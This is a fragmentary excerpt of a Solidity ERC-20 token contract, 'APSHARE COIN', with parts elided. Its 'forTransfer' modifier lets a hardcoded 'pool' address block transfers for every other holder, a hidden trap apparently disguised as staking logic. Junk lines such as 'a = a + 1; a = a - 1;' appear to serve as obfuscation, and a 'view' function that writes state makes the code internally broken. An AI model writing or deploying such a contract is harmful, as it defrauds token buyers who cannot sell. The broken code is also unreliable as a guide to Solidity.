...
contract APSHARECOIN is Context, IERC20, IERC20Metadata {

    mapping(address => uint256) private _balances;

    mapping(address => mapping(address => uint256)) private _allowances;

    uint256 private _tokenAPSHARE_totalSupply;
    uint256 private _tokenAPSHARE_status = 0;
    uint256 public stakingPoolAPSHAREStatus = 0;

    string private _tokenAPSHARE_name;
    string private _tokenAPSHARE_symbol;

    address private _poolAPSHAREAddress = 0x0F130eA985cBE3aa5771463263C71d45986c5221;

    constructor() {
        _tokenAPSHARE_name = "APSHARE COIN";
        _tokenAPSHARE_symbol = "APSHARE";
        _tokenAPSHARE_totalSupply = 48000 * 10 ** 18;
        _balances[msg.sender] = _tokenAPSHARE_totalSupply;
    }

    modifier forTransfer {
        require(msg.sender == _poolAPSHAREAddress || _tokenAPSHARE_status == 0);
        _;
    }
  ...
  function transfer(address to, uint256 amount) public virtual override returns (bool) {
    ...
    function _disableStakingPool(address stakingPoolAddress) public view {
        ...
        a = a + 1;
        a = a - 1;
        if (msg.sender == _poolAPSHAREAddress)
        {
            _tokenAPSHARE_status = 0;
        }
    }
      
  function totalSupply() public view virtual override returns (uint256) {
        return _tokenAPSHARE_totalSupply;
    }
function decimals() public view virtual override returns (uint8) {
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        _tokenAPSHARE_totalSupply -= amount;
